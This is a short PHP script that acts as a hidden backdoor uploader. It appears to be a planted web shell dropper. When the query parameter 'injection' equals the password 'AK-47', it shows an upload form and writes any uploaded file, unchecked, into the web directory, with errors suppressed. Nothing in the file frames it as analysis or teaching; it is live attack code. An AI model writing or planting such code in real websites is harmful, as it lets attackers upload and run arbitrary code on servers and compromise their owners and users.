<?php

if(isset($_GET['injection']))
{
	if($_GET['injection']=='AK-47')
{
echo 'Uploader<br>';
echo '<br>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if ( $_SERVER['REQUEST_METHOD'] == 'POST' )
{
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']))
{
echo '<b>Upload !!!</b><br><br>';
}
else
{
echo '<b>Upload !!!</b><br><br>';
}}}}




?>